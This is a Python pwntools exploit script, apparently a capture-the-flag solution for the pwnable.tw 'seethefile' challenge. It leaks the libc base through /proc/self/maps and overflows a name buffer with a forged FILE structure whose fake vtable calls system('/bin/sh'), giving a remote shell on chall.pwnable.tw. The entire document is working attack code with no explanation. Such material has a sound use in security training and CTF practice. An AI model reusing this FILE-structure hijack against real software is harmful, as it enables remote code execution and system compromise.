#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def sla(msg, data):
    p.sendlineafter(msg, data)

def open_file(file):
    sla(b'choice :', b'1')
    sla(b'see :', file)

def read():
    sla(b'choice :', b'2')

def write():
    sla(b'choice :', b'3')
    return p.recvuntil(b'---------------MENU---------------', drop=True)

def close():
    sla(b'choice :', b'4')

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10200)

##################################
### Stage 1: Leak libc address ###
##################################
# Read first
open_file(b'/proc/self/maps')
output = b''
for i in range(4):
    read()
    output += write()[:-1]

# Parse later
output = output.decode().split('\n')
for i in output:
    if 'libc-2.23.so' in i and 'r-xp' in i:
        libc.address = int(i.split('-')[0], 16)
        break
log.info(hex(libc.address))

######################################
### Stage 2: File structure attack ###
######################################
file = FileStructure()
file.flags = u32(b'/bin')
file._IO_read_ptr = u32(b'/sh\x00')
file._lock = 0x804ba00
file.vtable = 0x804b284 - 0x44
payload = flat(
    b'A'*0x20,
    0x804b290, libc.sym['system'], 0, 0,
    bytes(file)
    )
p.sendlineafter(b'choice :', b'5')
p.sendlineafter(b'name :', payload)

p.interactive()